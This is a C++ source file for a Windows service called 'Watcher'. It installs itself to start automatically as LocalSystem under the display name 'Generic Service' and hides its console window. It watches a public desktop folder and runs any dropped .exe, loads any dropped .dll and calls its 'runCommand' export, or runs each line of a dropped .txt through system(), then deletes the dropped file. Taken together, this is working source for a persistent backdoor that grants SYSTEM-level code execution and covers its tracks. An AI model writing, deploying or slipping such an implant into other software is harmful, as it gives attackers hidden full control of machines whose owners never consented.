// WatcherService.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;
LPTSTR				  lpWatchDir = TEXT("C:\\Users\\Public\\Desktop\\Watch");;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
DWORD InstallService();
DWORD DeleteService();
DWORD WatchDir(LPTSTR, HANDLE);
VOID HandleNotification(PFILE_NOTIFY_INFORMATION, LPTSTR lpDir);
VOID RunExe(LPTSTR, LPTSTR);
VOID LoadDll(LPTSTR);
VOID RunScript(LPTSTR);

#define SERVICE_NAME  TEXT("Watcher")
#define BUFFERSIZE 1024

typedef void(__cdecl *RUNCMD)(DWORD);

int _tmain(int argc, TCHAR *argv[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	OutputDebugString(_T("Watcher Service: Main: Entry"));

	STARTUPINFO si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;
	WCHAR cmd[MAX_PATH] = { 0 };
	
	//WCHAR lpCurrDir[MAX_PATH] = { 0 };
	//GetCurrentDirectory(MAX_PATH, lpCurrDir);
	
	if (argc == 2 && wcscmp(argv[1], TEXT("-install")) == 0)
	{
		//wsprintf(cmd, TEXT("sc create %s binPath= \"%s\\WatcherService.exe\" start= auto obj= LocalSystem password= \"\"\n"), SERVICE_NAME, lpWatchDir);
		//_tprintf(TEXT("Installing service: %s\n%s\n"), SERVICE_NAME, cmd);
		//return _wsystem(cmd);
		InstallService();
	}
	else if (argc == 2 && wcscmp(argv[1], TEXT("-delete")) == 0)
	{
		//wsprintf(cmd, TEXT("sc delete %s\n"), SERVICE_NAME);
		//_tprintf(TEXT("Deleting service: %s\n%s\n"),SERVICE_NAME, cmd);
		//return _wsystem(cmd);
		return DeleteService();
	}

	SERVICE_TABLE_ENTRY ServiceTable[] =
	{
		{ SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
		{ NULL, NULL }
	};

	
	StartServiceCtrlDispatcher(ServiceTable);
	//wsprintf(cmd, TEXT("net start %s\n"), SERVICE_NAME);
	//_wsystem(cmd);
	wsprintf(cmd, TEXT("cmd /k net start %s && exit\n"), SERVICE_NAME);
	CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	OutputDebugString(_T("Watcher Service: Main: Exit"));
	return ERROR_SUCCESS;
}


VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
	DWORD Status = E_FAIL;

	OutputDebugString(_T("Watcher Service: ServiceMain: Entry"));

	g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

	if (g_StatusHandle == NULL)
	{
		OutputDebugString(_T("Watcher Service: ServiceMain: RegisterServiceCtrlHandler returned error"));
		goto EXIT;
	}

	// Tell the service controller we are starting
	ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwServiceSpecificExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		OutputDebugString(_T("Watcher Service: ServiceMain: SetServiceStatus returned error"));
	}

	/*
	* Perform tasks neccesary to start the service here
	*/
	OutputDebugString(_T("Watcher Service: ServiceMain: Performing Service Start Operations"));

	// Create stop event to wait on later.
	g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_ServiceStopEvent == NULL)
	{
		OutputDebugString(_T("Watcher Service: ServiceMain: CreateEvent(g_ServiceStopEvent) returned error"));

		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = GetLastError();
		g_ServiceStatus.dwCheckPoint = 1;

		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
		{
			OutputDebugString(_T("Watcher Service: ServiceMain: SetServiceStatus returned error"));
		}
		goto EXIT;
	}

	// Tell the service controller we are started
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		OutputDebugString(_T("Watcher Service: ServiceMain: SetServiceStatus returned error"));
	}

	// Start the thread that will perform the main task of the service
	HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

	OutputDebugString(_T("Watcher Service: ServiceMain: Waiting for Worker Thread to complete"));

	// Wait until our worker thread exits effectively signaling that the service needs to stop
	WaitForSingleObject(hThread, INFINITE);

	OutputDebugString(_T("Watcher Service: ServiceMain: Worker Thread Stop Event signaled"));


	/*
	* Perform any cleanup tasks
	*/
	OutputDebugString(_T("Watcher Service: ServiceMain: Performing Cleanup Operations"));
	CloseHandle(g_ServiceStopEvent);

	g_ServiceStatus.dwControlsAccepted = 0;
	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 3;

	if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
	{
		OutputDebugString(_T("Watcher Service: ServiceMain: SetServiceStatus returned error"));
	}

EXIT:
	OutputDebugString(_T("Watcher Service: ServiceMain: Exit"));

	return;

}


VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
	OutputDebugString(_T("Watcher Service: ServiceCtrlHandler: Entry"));

	switch (CtrlCode)
	{
	case SERVICE_CONTROL_STOP:

		OutputDebugString(_T("Watcher Service: ServiceCtrlHandler: SERVICE_CONTROL_STOP Request"));

		if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
			break;

		/*
		* Perform tasks neccesary to stop the service here
		*/

		g_ServiceStatus.dwControlsAccepted = 0;
		g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		g_ServiceStatus.dwWin32ExitCode = 0;
		g_ServiceStatus.dwCheckPoint = 4;

		if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
		{
			OutputDebugString(_T("Watcher Service: ServiceCtrlHandler: SetServiceStatus returned error"));
		}

		// This will signal the worker thread to start shutting down
		SetEvent(g_ServiceStopEvent);

		break;

	default:
		break;
	}

	OutputDebugString(_T("Watcher Service: ServiceCtrlHandler: Exit"));
}


DWORD InstallService()
{
	WCHAR lpCurrDir[MAX_PATH];
	SC_HANDLE scManagerHandle;
	SC_HANDLE scServiceHandle;

	GetCurrentDirectory(MAX_PATH, lpCurrDir);
	std::wstring wstrBinPath = lpCurrDir;
	wstrBinPath.append(TEXT("\\WatcherService.exe"));

	if ((scManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)
		return GetLastError();

	if ((scServiceHandle = CreateService(scManagerHandle, SERVICE_NAME,
		TEXT("Generic Service"),
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		wstrBinPath.c_str(),
		NULL,
		NULL,
		NULL,
		TEXT("LocalSystem"),
		TEXT(""))) == NULL)
		return GetLastError();

	CloseServiceHandle(scServiceHandle);
	return ERROR_SUCCESS;
}



DWORD DeleteService()
{
	SC_HANDLE scManagerHandle;
	SC_HANDLE scServiceHandle;

	if ((scManagerHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)
		return GetLastError();

	if ((scServiceHandle = OpenService(scManagerHandle, SERVICE_NAME, SERVICE_ALL_ACCESS)) == NULL)
		return GetLastError();

	if (!DeleteService(scServiceHandle))
		return GetLastError();

	if (!CloseServiceHandle(scServiceHandle))
		return GetLastError();

	return true;
}


DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
	OutputDebugString(_T("Watcher Service: ServiceWorkerThread: Entry"));

	DWORD dwResult = 0;
	//HANDLE hToken = NULL;
	//DWORD dwPathSize = MAX_PATH;
	WCHAR lpUserDir[MAX_PATH] = { 0 };
	HANDLE hDirectory = NULL;

	//// Obtain a handle to the current process's primary token
	//if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	//	return(GetLastError());

	//// Get user profile directory path
	//if (!GetUserProfileDirectory(hToken, lpUserDir, &dwPathSize))
	//{
	//	CloseHandle(hToken);
	//	return(GetLastError());
	//}

	//CloseHandle(hToken);

	//std::wstring wstrWatchDir = lpUserDir;
	//wstrWatchDir.append(TEXT("\\Watcher"));
	//LPTSTR lpDir = (LPTSTR)wstrWatchDir.c_str();


	// Create directory if dose not already exist
	CreateDirectory(lpWatchDir, NULL);

	if ((hDirectory = CreateFile(
		lpWatchDir,
		FILE_LIST_DIRECTORY,
		(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE),
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_BACKUP_SEMANTICS,
		NULL
	)) == NULL)
	{
		return(GetLastError());
	}


	//  Periodically check if the service has been requested to stop
	while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
	{
		if ((dwResult = WatchDir(lpWatchDir, hDirectory)) != ERROR_SUCCESS)
			return dwResult;
	}

	OutputDebugString(_T("Watcher Service: ServiceWorkerThread: Exit"));

	return ERROR_SUCCESS;
}



DWORD WatchDir(LPTSTR lpDir, HANDLE hDirectory) {

	WCHAR lpBuffer[BUFFERSIZE] = { 0 };
	PFILE_NOTIFY_INFORMATION notifInfos[10] = { 0 };
	DWORD dwBytesReturned = 0;

	//wait for change in the monitored directory
	if (!ReadDirectoryChangesW(
		hDirectory,
		(LPVOID)lpBuffer,
		sizeof(lpBuffer),
		TRUE,
		FILE_NOTIFY_CHANGE_FILE_NAME,
		&dwBytesReturned,
		NULL,
		NULL))
	{
		CloseHandle(hDirectory);
		return GetLastError();
	}

	HandleNotification((PFILE_NOTIFY_INFORMATION)lpBuffer, lpDir);

	return ERROR_SUCCESS;

}


VOID HandleNotification(PFILE_NOTIFY_INFORMATION notifInfo, LPTSTR lpDir)
{

	if (notifInfo->Action == FILE_ACTION_ADDED)
	{

		std::wstring wstrExePath = lpDir;
		wstrExePath.append(TEXT("\\"));
		wstrExePath.append(notifInfo->FileName);
		LPTSTR lpFullPath = (LPTSTR)wstrExePath.c_str();

		TCHAR lpExt[_MAX_EXT];
		_tsplitpath_s(notifInfo->FileName, NULL, 0, NULL, 0, NULL, 0, lpExt, _MAX_EXT);

		if (!wcscmp(lpExt, TEXT(".exe")))
			RunExe(lpFullPath, lpDir);

		else if (!wcscmp(lpExt, TEXT(".txt")))
			RunScript(lpFullPath);

		else if (!wcscmp(lpExt, TEXT(".dll")))
			LoadDll(lpFullPath);

		DeleteFile(lpFullPath);

	}


	if (notifInfo->NextEntryOffset)
		HandleNotification((PFILE_NOTIFY_INFORMATION)((char*)notifInfo + notifInfo->NextEntryOffset), lpDir);

}


VOID RunExe(LPTSTR lpExePath, LPTSTR lpHomeDir)
{

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	Sleep(2000); // wait for file to finish copying

	if (CreateProcess(
		lpExePath,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		lpHomeDir,
		&si,
		&pi
	))
	{
		// Wait until child process exits.
		WaitForSingleObject(pi.hProcess, INFINITE);

		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else
	{
		if (GetLastError() == ERROR_SHARING_VIOLATION)
			return RunExe(lpExePath, lpHomeDir);
	}
}


VOID LoadDll(LPTSTR lpDllPath)
{

	Sleep(2000); // wait for file to finish copying

	HMODULE hDllModule = NULL;
	RUNCMD runCmd = NULL;

	if ((hDllModule = LoadLibrary(lpDllPath)) != NULL &&
		(runCmd = (RUNCMD)GetProcAddress(hDllModule, "runCommand")) != NULL)
		runCmd(GetCurrentProcessId());

	FreeLibrary(hDllModule);

}


VOID RunScript(LPTSTR lpScriptPath)
{

	Sleep(2000); // wait for file to finish copying

	std::ifstream fileStram(lpScriptPath);
	if (fileStram.is_open())
	{
		for (std::string strCmd; getline(fileStram, strCmd); )
			system(strCmd.c_str());
	}

	fileStram.close();

}